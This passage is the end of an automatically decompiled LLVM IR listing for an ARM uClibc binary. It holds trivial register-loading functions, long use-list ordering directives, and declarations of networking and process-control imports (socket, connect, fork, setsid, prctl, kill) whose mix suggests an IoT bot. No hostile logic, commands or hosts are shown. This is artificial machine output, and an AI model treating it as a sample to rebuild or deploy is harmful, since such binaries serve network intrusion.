496, 495, 494, 493, 492, 491, 490, 489, 488, 487, 115, 114, 111, 112, 113, 117, 118, 126, 125, 120, 119, 116, 121, 123, 122, 124, 499, 500, 233, 232, 231, 412 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_13638() local_unnamed_addr {
dec_label_pc_13638:
  %v5_1363c = load i32, i32* @r0, align 4
  ret i32 %v5_1363c

; uselistorder directives
  uselistorder i32* @r0, { 2, 3, 4, 8, 97, 9, 98, 10, 99, 12, 11, 56, 57, 0, 17, 18, 19, 21, 22, 23, 24, 25, 20, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 51, 52, 1, 7, 43, 44, 45, 46, 47, 48, 49, 50, 53, 54, 58, 55, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 6, 5, 13, 14, 15, 16 }
}

define i32 @function_13640() local_unnamed_addr {
entry:
  %v3_13644 = load i32, i32* @r4, align 4
  %v0_1364c = call i32 @function_8d80()
  call void @__pseudo_branch(i32 %v3_13644)
  ret i32 %v0_1364c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 5, 7, 8, 9, 1, 2, 3, 4, 6 }
  uselistorder i32 0, { 0, 1053, 88, 1054, 1055, 190, 189, 490, 72, 73, 74, 75, 492, 491, 57, 56, 89, 1056, 1057, 1058, 1059, 1061, 1060, 1, 1062, 1063, 192, 191, 493, 76, 77, 78, 79, 495, 494, 59, 58, 55, 63, 1064, 496, 2, 1065, 1066, 80, 1067, 1068, 1069, 1070, 1071, 100, 497, 500, 498, 499, 1072, 501, 97, 101, 744, 745, 81, 746, 747, 748, 3, 520, 195, 5, 4, 102, 749, 103, 521, 6, 196, 104, 105, 217, 60, 106, 7, 9, 8, 222, 71, 636, 637, 751, 750, 752, 753, 29, 107, 754, 110, 109, 108, 218, 219, 220, 112, 111, 113, 223, 755, 756, 114, 726, 727, 98, 115, 757, 116, 566, 117, 758, 759, 760, 118, 761, 762, 567, 541, 119, 120, 571, 568, 542, 543, 544, 545, 556, 539, 522, 230, 540, 562, 563, 546, 547, 548, 523, 228, 549, 550, 524, 229, 551, 552, 525, 227, 553, 554, 526, 226, 555, 557, 527, 225, 558, 565, 528, 224, 559, 564, 560, 70, 61, 193, 194, 561, 502, 569, 231, 570, 198, 572, 90, 573, 232, 574, 577, 578, 122, 197, 575, 576, 233, 234, 579, 580, 581, 582, 583, 584, 585, 586, 529, 587, 588, 67, 235, 590, 591, 592, 593, 594, 595, 596, 597, 236, 598, 82, 599, 99, 600, 519, 601, 602, 603, 518, 604, 605, 606, 121, 237, 238, 607, 610, 611, 612, 613, 614, 123, 608, 124, 609, 10, 125, 589, 715, 716, 615, 616, 239, 617, 618, 619, 126, 620, 621, 622, 623, 624, 625, 626, 240, 68, 241, 627, 11, 628, 202, 629, 630, 631, 632, 242, 530, 221, 128, 127, 199, 243, 633, 12, 13, 634, 635, 129, 130, 244, 638, 639, 640, 641, 642, 93, 643, 645, 644, 91, 92, 131, 200, 245, 646, 211, 212, 213, 94, 132, 64, 133, 647, 648, 84, 85, 65, 134, 135, 136, 203, 649, 95, 650, 651, 652, 201, 653, 137, 654, 655, 246, 656, 657, 658, 138, 139, 659, 140, 660, 86, 87, 66, 141, 142, 204, 661, 662, 663, 664, 143, 665, 666, 667, 144, 146, 145, 205, 669, 668, 147, 670, 671, 148, 672, 153, 248, 249, 673, 151, 152, 149, 150, 674, 154, 675, 250, 251, 247, 676, 155, 157, 156, 158, 678, 679, 677, 680, 14, 15, 16, 17, 18, 681, 159, 682, 160, 161, 206, 684, 683, 685, 687, 688, 686, 19, 20, 21, 22, 23, 689, 162, 690, 691, 692, 693, 694, 62, 163, 165, 164, 207, 696, 695, 252, 697, 699, 700, 701, 702, 703, 253, 704, 24, 25, 26, 698, 27, 28, 705, 166, 706, 707, 167, 169, 168, 208, 710, 708, 709, 254, 712, 711, 713, 170, 714, 717, 171, 173, 172, 209, 720, 719, 718, 255, 722, 721, 723, 174, 724, 725, 256, 728, 729, 175, 730, 731, 732, 176, 733, 257, 734, 735, 30, 736, 737, 738, 739, 740, 763, 177, 764, 741, 178, 742, 179, 765, 766, 767, 743, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 258, 781, 503, 504, 505, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 31, 823, 824, 825, 180, 181, 826, 259, 827, 828, 829, 830, 506, 531, 831, 832, 833, 32, 834, 835, 836, 837, 33, 838, 839, 840, 841, 842, 843, 844, 34, 845, 846, 186, 847, 848, 849, 850, 851, 852, 35, 853, 854, 855, 36, 856, 857, 858, 37, 859, 860, 861, 862, 262, 876, 877, 863, 864, 865, 866, 867, 868, 869, 870, 871, 507, 532, 872, 873, 874, 875, 508, 533, 878, 879, 880, 38, 881, 882, 263, 883, 884, 885, 886, 887, 888, 889, 890, 509, 534, 891, 892, 893, 39, 894, 895, 896, 897, 40, 898, 510, 899, 900, 903, 904, 511, 182, 901, 902, 183, 184, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 512, 535, 916, 917, 918, 41, 919, 920, 921, 922, 923, 924, 42, 925, 96, 926, 927, 928, 929, 513, 536, 930, 931, 932, 43, 933, 185, 934, 935, 936, 44, 937, 938, 939, 940, 941, 514, 537, 942, 943, 944, 45, 945, 946, 947, 46, 260, 261, 948, 949, 950, 951, 952, 515, 538, 953, 954, 955, 47, 956, 957, 958, 48, 959, 960, 961, 49, 962, 963, 964, 50, 965, 966, 967, 968, 51, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 981, 982, 516, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 210, 994, 997, 998, 1001, 1002, 1003, 52, 999, 1000, 995, 996, 1004, 1005, 187, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 53, 188, 1016, 1017, 1018, 54, 1019, 1020, 1021, 1022, 1024, 69, 264, 1025, 1023, 979, 980, 83, 1026, 517, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 214, 1047, 215, 1048, 216, 1049, 1052, 1050, 1051, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086 }
  uselistorder i32* @r4, { 27, 414, 319, 320, 113, 114, 55, 56, 321, 322, 323, 324, 325, 326, 28, 29, 30, 31, 32, 33, 34, 35, 57, 58, 36, 37, 38, 39, 59, 60, 40, 43, 44, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 61, 62, 53, 54, 63, 64, 65, 66, 69, 70, 71, 72, 73, 74, 75, 0, 76, 67, 68, 293, 294, 295, 296, 297, 77, 78, 79, 80, 81, 82, 83, 3, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 20, 105, 106, 107, 108, 109, 110, 111, 1, 112, 115, 116, 117, 2, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 142, 134, 135, 136, 137, 138, 139, 140, 141, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 4, 172, 5, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 6, 196, 7, 197, 8, 198, 9, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 10, 221, 11, 222, 12, 223, 13, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 259, 251, 252, 253, 254, 255, 256, 257, 258, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 14, 278, 15, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 298, 299, 300, 16, 301, 17, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 21, 357, 358, 26, 359, 19, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 25, 18, 371, 372, 373, 374, 375, 376, 377, 24, 378, 379, 380, 23, 381, 382, 383, 22, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 415 }
}

declare i8* @strcpy(i8*, i8*) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @sigemptyset(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32* @memmove(i32*, i32*, i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32* @memcpy(i32*, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32* @malloc(i32) local_unnamed_addr

declare i32 @sleep(i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @select(i32, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %timeval*) local_unnamed_addr

declare %dirent* @readdir(%__dirstream*) local_unnamed_addr

declare i32 @sigaddset(%_TYPEDEF_sigset_t*, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare void @abort() local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32* @calloc(i32, i32) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @inet_addr(i8*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @realloc(i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @__uClibc_main() local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare %__dirstream* @opendir(i8*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock() local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @closedir(%__dirstream*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @__data_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1c184 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c184, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 false, { 1, 3, 14, 2, 11, 4, 41, 13, 10, 15, 5, 6, 7, 40, 0, 16, 8, 9, 42, 37, 67, 71, 45, 72, 73, 46, 74, 21, 22, 23, 24, 47, 75, 76, 63, 77, 78, 79, 52, 80, 26, 27, 53, 81, 54, 82, 48, 49, 50, 25, 83, 51, 84, 85, 62, 86, 87, 88, 89, 90, 91, 55, 56, 92, 93, 57, 94, 58, 59, 95, 60, 96, 61, 97, 43, 44, 98, 99, 100, 101, 102, 103, 28, 29, 64, 104, 105, 65, 35, 106, 66, 18, 19, 30, 20, 31, 32, 33, 12, 34, 107, 36, 38, 68, 69, 108, 17, 70, 109, 39, 110, 111 }
  uselistorder i1* @cpsr_z, { 9, 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare %timeval* @__decompiler_undefined_function_3() local_unnamed_addr

declare %sockaddr* @__decompiler_undefined_function_4() local_unnamed_addr

declare %_TYPEDEF_fd_set* @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
